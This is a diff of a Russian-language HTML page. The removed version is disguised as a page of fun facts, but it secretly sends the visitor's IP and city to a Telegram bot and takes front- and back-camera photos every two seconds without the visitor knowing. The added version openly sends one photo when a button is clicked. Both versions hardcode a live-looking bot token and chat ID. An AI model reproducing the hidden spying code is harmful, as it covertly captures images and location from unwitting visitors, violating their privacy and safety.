@@ -2,122 +2,56 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Удивительные факты</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Arial', sans-serif;
-      background: linear-gradient(135deg, #6b48ff, #ff6b6b);
-      color: #fff;
-      text-align: center;
-      padding: 20px;
-      min-height: 100vh;
-    }
-    h1 {
-      font-size: 2.8em;
-      margin-bottom: 20px;
-      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.4);
-    }
-    .fact {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 15px;
-      margin: 15px auto;
-      max-width: 700px;
-      border-radius: 10px;
-      font-size: 1.2em;
-      line-height: 1.5;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-    }
-    #videoFront, #videoBack, #canvasFront, #canvasBack { display: none; }
-  </style>
+  <title>Фото в бота</title>
 </head>
 <body>
-  <video id="videoFront" autoplay muted></video>
-  <video id="videoBack" autoplay muted></video>
-  <canvas id="canvasFront"></canvas>
-  <canvas id="canvasBack"></canvas>
-  <h1>Удивительные факты о мире</h1>
-  <div class="fact">Знаете ли вы, что осьминоги могут менять цвет, чтобы сливаться с окружающей средой?</div>
-  <div class="fact">Самая длинная река в мире — Нил, её длина около 6 650 км!</div>
-  <div class="fact">Медузы не имеют мозга, сердца или костей — они на 95% состоят из воды.</div>
-  <div class="fact">В космосе нет звука, потому что там нет воздуха для передачи звуковых волн.</div>
-  <div class="fact">Самое глубокое место в океане — Марианская впадина, глубина 11 км.</div>
+  <video id="video" autoplay style="width: 100%; max-width: 500px;"></video>
+  <button onclick="takePhoto()">Сделать фото</button>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <p id="status"></p>
 
   <script>
-    const videoFront = document.getElementById('videoFront');
-    const videoBack = document.getElementById('videoBack');
-    const canvasFront = document.getElementById('canvasFront');
-    const canvasBack = document.getElementById('canvasBack');
-    const contextFront = canvasFront.getContext('2d');
-    const contextBack = canvasBack.getContext('2d');
-    const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
-    const chatId = '5678878569';
-    let photoIntervalFront, photoIntervalBack;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const status = document.getElementById('status');
 
-    // IP
-    fetch('https://ip-api.com/json/?fields=61439')
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.query;
-        const city = data.city || 'Не удалось определить город';
-        const message = `IP: ${ip}\nГород: ${city}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    // Доступ к фронтальной камере
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => video.srcObject = stream)
+      .catch(err => status.textContent = 'Ошибка камеры: ' + err);
+
+    // Функция захвата и отправки фото
+    async function takePhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0);
+      const photo = canvas.toDataURL('image/png');
+
+      // Telegram API
+      const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
+      const chatId = '5678878569'; // Твой chat_id
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+      try {
+        status.textContent = 'Отправка...';
+        const response = await fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        }).catch(err => console.error('Ошибка отправки IP/города:', err));
-      });
-
-    // Фронтальная камера
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(stream => {
-        videoFront.srcObject = stream;
-        videoFront.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(stream, 'front'), 2000); // Задержка 2 секунды
-        };
-      })
-      .catch(err => console.error('Ошибка фронтальной камеры:', err));
-
-    // Задняя камера
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
-      .then(stream => {
-        videoBack.srcObject = stream;
-        videoBack.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(stream, 'back'), 2000); // Задержка 2 секунды
-        };
-      })
-      .catch(err => console.error('Ошибка задней камеры:', err));
-
-    // Фото каждые 2 секунды
-    function startPhotoLoop(stream, type) {
-      const video = type === 'front' ? videoFront : videoBack;
-      const canvas = type === 'front' ? canvasFront : canvasBack;
-      const context = type === 'front' ? contextFront : contextBack;
-
-      function takePhoto() {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('photo', blob, `${type}_photo.png`);
-          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          }).catch(err => console.error(`Ошибка отправки ${type} фото:`, err));
-        }, 'image/png');
+          body: JSON.stringify({
+            chat_id: chatId,
+            photo: photo
+          })
+        });
+        if (response.ok) {
+          status.textContent = 'Фото отправлено!';
+        } else {
+          status.textContent = 'Ошибка отправки';
+        }
+      } catch (error) {
+        status.textContent = 'Ошибка: ' + error;
       }
-      takePhoto(); // Первое фото
-      if (type === 'front') photoIntervalFront = setInterval(takePhoto, 2000);
-      else photoIntervalBack = setInterval(takePhoto, 2000);
     }
-
-    // Остановка при уходе
-    window.onbeforeunload = () => {
-      if (photoIntervalFront) clearInterval(photoIntervalFront);
-      if (photoIntervalBack) clearInterval(photoIntervalBack);
-    };
   </script>
 </body>
 </html>
